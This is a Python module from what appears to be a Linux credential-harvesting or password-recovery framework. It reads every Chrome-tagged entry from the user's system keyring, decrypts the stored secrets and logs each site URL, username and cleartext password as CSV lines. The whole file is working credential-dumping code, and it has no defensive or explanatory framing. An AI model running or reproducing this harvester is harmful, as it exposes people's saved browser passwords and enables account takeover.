# coding: utf-8

try:
	import keyring
except ImportError:
	pass

from modules.linux.chrome.chrome_module import ChromeModule


class ChromeKeyringPassword(ChromeModule):
	def __init__(self):
		ChromeModule.__init__(
			self,
			name='ChromeKeyringPassword',
			version='0.1.0',
			file=__file__,
			dependencies=['keyring'],
		)

	def can(self):
		return super().can()

	def has(self):
		return super().has()

	def execute(self) -> bool:
		if not super().execute():
			return False

		results = []
		for item in keyring.get_keyring().get_preferred_collection().get_all_items():
			vals = item.get_attributes()
			if 'application' in vals and 'chrome' in vals['application'].lower():
				try:
					url = vals['action_url'] if vals['action_url'] else item.get_label()
					username = vals['username_value']
					password = item.get_secret()
					results.append({'url': url, 'username': username, 'password': password.decode('utf-8')})
				except:
					pass

		self.log('url,username,password')
		for result in results:
			self.log(result['url'] + ',' + result['username'] + ',' + result['password'])

		return True